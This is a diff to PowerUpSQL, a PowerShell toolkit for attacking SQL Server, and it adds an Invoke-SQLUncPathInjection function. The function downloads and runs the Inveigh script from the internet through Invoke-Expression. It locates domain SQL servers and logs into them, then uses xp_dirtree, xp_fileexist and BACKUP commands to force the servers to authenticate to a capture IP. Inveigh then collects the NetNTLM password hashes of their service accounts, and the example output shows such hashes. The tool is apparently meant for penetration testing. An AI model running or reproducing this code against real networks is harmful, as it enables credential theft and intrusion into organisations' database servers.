@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.84.107
+        Version: 1.85.107
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -843,6 +843,249 @@ Function  Get-SQLQueryThreaded
 #region          COMMON FUNCTIONS
 #
 #########################################################################
+
+
+# ----------------------------------
+#  Invoke-SQLUncPathInjection
+# ----------------------------------
+# Author: Scott Sutherland (@_nullbind)
+# Updates: Thomas Elling
+Function Invoke-SQLUncPathInjection {
+
+    <#
+            .SYNOPSIS
+            Locates domain sql servers, loads inveigh, attempts login, and unc path injects to capture password hash of associated service account.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER CaptureIp
+            IP address for listening and packet sniffing.
+            .EXAMPLE
+            PS C:\> Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
+            VERBOSE: Inveigh loaded
+            VERBOSE: You have Administrator rights.
+            VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)...
+            VERBOSE: Parsing SQL Server instances from SPNs...
+            VERBOSE: 36 instances were found.
+            VERBOSE: Attempting to log into each instance...
+            ...
+            Cleartext NetNTLMv1                                                                                                                
+            --------- ---------                                                                                                                
+                      Server1$::demo.local:A0F2FF845622186D00000000000000000000000000000000:091B709EFB488SDFSDF525D526BB5DCAAFE352C88A818A...
+                      Server1$::demo.local:FFAF3DA18451B1CA00000000000000000000000000000000:7C3296SDF07E0230B4EF7D892789EB5F0D3ED251C4186...
+                      Workstation$::demo.local:3284525F0D2A495B00000000000000000000000000000000:EF6CAD0F2738000490FSDFE5628CC82DAE67BE92A77690CB...
+                      NASServer1$::demo.local:432194457F8D1D6FA00000000000000000000000000000000:63EE53E0D93448BC003BB560F80ASDF72881B676B529174F...
+                      SvcUser::demo.local:DC334ECBFDD018B700000000000000000000000000000000:98A367A3E26A6E0F99E9F3DBE427FA07B231A9F6DCD51A8F...
+                      DBA::demo.local:875A296AAFEDA8BE00000000000000000000000000000000:DDA8D84AA3F79807DSDF7ECD648264187FBD7EB849128...
+
+            .NOTES
+            alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
+    #>
+
+    [CmdletBinding()]
+    Param(
+      [Parameter(Mandatory=$false)]
+       [string]$Username,
+    
+       [Parameter(Mandatory=$false)]
+       [string]$Password,
+
+       [Parameter(Mandatory=$false)]
+       [string]$DomainController,
+
+       [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+       HelpMessage = 'SQL Server instance to connection to.')]
+       [string]$Instance,
+
+       [Parameter(Mandatory=$true)]
+       [string]$CaptureIp,
+
+       [Parameter(Mandatory=$false)]
+       [int]$TimeOut = 5,
+
+       [Parameter(Mandatory=$false)]
+       [int]$Threads = 10
+
+    )
+
+    Begin 
+    {
+        # Attempt to load Inveigh via reflection - naturally this bombs if there is no outbound internet. Exits if not loaded.
+        try {
+            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1') -ErrorAction Stop
+            Write-Verbose "Inveigh loaded"
+        } catch {
+            $ErrorMessage = $_.Exception.Message
+            Write-Verbose "$ErrorMessage"
+
+            # Check if Inveigh is loaded in memory
+            $Loaded = Test-Path -Path Function:\Invoke-Inveigh
+            if($Loaded -eq 'True')
+            {
+                Write-Verbose "Inveigh loaded."
+            }else{
+                Write-Verbose "Inveigh NOT loaded. Ensure Inveigh is loaded."
+                break
+            }
+        }
+
+        # Create table
+        $TblInveigh = New-Object -TypeName System.Data.DataTable
+        $null = $TblInveigh.Columns.Add('Cleartext')
+        $null = $TblInveigh.Columns.Add('NetNTLMv1')
+        $null = $TblInveigh.Columns.Add('NetNTLMv2')
+    }
+
+    Process
+    {
+
+        # Check if the current process has elevated privs
+        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
+        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)                        
+        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+        $IsAdmin = $prp.IsInRole($adm)
+        if (-not $IsAdmin)
+        {
+            Write-Verbose -Message "You do not have Administrator rights. Run this function in a privileged process for best results."                            
+        }
+        else
+        {
+            Write-Verbose -Message "You have Administrator rights."
+                          
+        }
+
+        # If SQL instances are not provided, autopug
+        if(-not $Instance)
+        {
+            # Discover SQL Servers on the Domain via LDAP queries for SPN records
+            $SQLServerInstances = Get-SQLInstanceDomain -verbose -DomainController $DomainController -Username $Username -Password $Password 
+        } else {
+            # Test instances from pipeline and check connectivity
+            $SQLServerInstances = $Instance 
+        }
+
+        # Get list of SQL Servers that the provided account can log into
+        Write-Verbose -Message "Attempting to log into each instance..."
+        $AccessibleSQLServers = $SQLServerInstances | Get-SQLConnectionTestThreaded -Verbose -Threads $Threads | ? {$_.status -eq "Accessible"}        
+        $AccessibleSQLServersCount = $AccessibleSQLServers.count
+
+        # Status user
+        Write-Verbose -Message "$AccessibleSQLServersCount SQL Server instances can be logged into"
+        Write-Verbose -Message "Starting UNC path injections against $AccessibleSQLServersCount instances..."
+
+        # Start sniffing
+        Write-Verbose -Message "Starting Invoke-Inveigh..."
+        Invoke-Inveigh -NBNS Y -MachineAccounts Y -IP $CaptureIp | Out-Null
+
+        # Perform unc path injection on each one
+        $AccessibleSQLServers | 
+        ForEach-Object{
+
+            # Get current instance
+            $CurrentInstance = $_.Instance
+
+            # Randomized 5 character file name
+            $UncFileName = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+
+            # Start unc path injection for each interface
+            Write-Verbose -Message "$CurrentInstance - Injecting UNC path to \\$CaptureIp\$UncFileName"
+
+            # Functions executable by the Public role that accept UNC paths - SQL Server 2000 to 2008
+            # https://support.microsoft.com/en-us/help/321185/how-to-determine-the-version--edition-and-update-level-of-sql-server-a
+
+            # Check version
+            $SQLVersionFull = Get-SQLServerInfo -Instance $CurrentInstance -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
+            if($SQLVersionFull)
+            {
+                $SQLVersionShort = $SQLVersionFull.Split('.')[0]
+            }
+
+            # Run the BACKUP commands for older version only (MS16-136)
+            if([int]$SQLVersionShort -le 11)
+            {
+                Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "BACKUP LOG [TESTING] TO DISK = '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null
+                Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "BACKUP DATABASE [TESTING] TO DISK = '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null
+            }
+
+            # Functions executable by the Public role that accept UNC paths
+            Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "xp_dirtree '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null 
+            Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "xp_fileexist '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null
+   
+            # Sleep to give the SQL Server time to send us hashes :)
+            sleep $TimeOut
+
+            # Display stuff
+            Get-Inveigh -Cleartext | Sort-Object |
+            ForEach-Object {
+                Write-Verbose -Message " - Cleartext: $_"
+            }
+
+            Get-Inveigh -NTLMv1 | Sort-Object |
+            ForEach-Object {
+                Write-Verbose -Message " - NetNTLMv1: $_"
+            }
+
+            Get-Inveigh -NTLMv2 | Sort-Object |
+            ForEach-Object {
+                Write-Verbose -Message " - NetNTLMv2: $_"
+            }
+        }
+    }
+
+    End
+    {
+
+            # Get cleartext returned 
+            Get-Inveigh -Cleartext | Sort-Object |
+            ForEach-Object {
+                
+                # Add records
+                [string]$NTLMv1 = ""
+                [string]$NTLMv2 = ""
+                [string]$Cleartext = $_
+                $null = $TblInveigh.Rows.Add([string]$Cleartext, [string]$NTLMv1, [string]$NTLMv2)            
+            }
+
+            # Get NetNTLMv1 returned
+            Get-Inveigh -NTLMv1 | Sort-Object |
+            ForEach-Object {
+                
+                # Add records
+                [string]$NTLMv1 = $_
+                [string]$NTLMv2 = ""
+                [string]$Cleartext = ""
+                $null = $TblInveigh.Rows.Add([string]$Cleartext, [string]$NTLMv1, [string]$NTLMv2)            
+            }
+
+            # Get NetNTLMv2 returned             
+            Get-Inveigh -NTLMv2 | Sort-Object |
+            ForEach-Object {
+                
+                # Add records
+                [string]$NTLMv1 = ""
+                [string]$NTLMv2 = $_
+                [string]$Cleartext = ""
+                $null = $TblInveigh.Rows.Add([string]$Cleartext, [string]$NTLMv1, [string]$NTLMv2)            
+            }
+
+        # Clear pw hash cache
+        Clear-Inveigh | Out-Null
+
+        # Stop pw hash capture
+        Stop-Inveigh | Out-Null
+        
+        # Return results
+        $TblInveigh
+
+    }
+}
+
 
 # ----------------------------------
 #  Invoke-SQLOSCmd
